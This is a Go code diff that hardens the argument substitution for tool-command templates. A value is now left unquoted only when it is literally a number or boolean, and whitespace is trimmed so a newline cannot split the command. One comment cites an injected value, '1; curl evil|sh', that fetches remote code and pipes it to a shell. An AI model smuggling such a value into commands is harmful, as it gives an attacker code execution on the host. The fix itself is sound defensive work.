@@ -89,50 +89,24 @@ func substitute(cmd string, params map[string]ToolParam, args map[string]any) (s
 		if !ok {
 			return "", fmt.Errorf("missing arg %q", name)
 		}
-		// Type-aware substitution: numeric and boolean values skip
-		// shell quoting and emit bare values, since their value
-		// space is constrained enough that they can't contain
-		// shell metacharacters by definition. String values still
-		// go through shellQuote so injection-safety is preserved.
-		//
-		// Two paths fire as "skip quoting":
-		//   1. Declared type is integer/number/boolean — the
-		//      author signaled this is constrained data.
-		//   2. The runtime VALUE is a number or bool — even if the
-		//      author declared the param as "string", a value like
-		//      float64(1) or true is safe to emit bare. This
-		//      defends against LLMs that author tools with sloppy
-		//      type declarations (everything typed as "string"),
-		//      where a `count` param then fails the downstream
-		//      script's int() / atoi() because it receives `'1'`
-		//      instead of `1`.
+		// Bare (unquoted) only when the VALUE is a number or boolean, or a
+		// string that is purely one ("1", "true": worker models pass numbers
+		// as strings, and a script's int() then chokes on '1'). The declared
+		// type used to be enough on its own, but the declaration is the
+		// author's and the value is the model's: an "integer" param handed
+		// "1; curl evil|sh" went into the command bare. A value that is not
+		// literally a number or boolean is quoted, whatever it was declared.
 		skipQuote := false
-		switch params[name].Type {
-		case "integer", "number", "boolean":
+		switch v := val.(type) {
+		case float64, float32, int, int64, int32, bool:
 			skipQuote = true
-		}
-		if !skipQuote {
-			switch val.(type) {
-			case float64, float32, int, int64, int32, bool:
-				skipQuote = true
-			}
-		}
-		// Third defense: the value is a STRING but it parses as a
-		// pure number or boolean literal. Worker LLMs often pass
-		// numeric args as JSON strings ("1" instead of 1) when the
-		// param's declared type is "string". Pure number / boolean
-		// strings have no shell metacharacters by definition — safe
-		// to emit bare, and necessary to avoid the int("1") → quoted
-		// → script-side parse failure pattern.
-		if !skipQuote {
-			if s, ok := val.(string); ok {
-				if looksLikeNumberLiteral(s) || looksLikeBoolLiteral(s) {
-					skipQuote = true
-				}
-			}
+		case string:
+			skipQuote = looksLikeNumberLiteral(v) || looksLikeBoolLiteral(v)
 		}
 		if skipQuote {
-			b.WriteString(stringify(val))
+			// Trimmed: " 1\n" parses as a number, and a bare newline would
+			// end the command there and run the rest of the template alone.
+			b.WriteString(strings.TrimSpace(stringify(val)))
 		} else {
 			b.WriteString(shellQuote(stringify(val)))
 		}
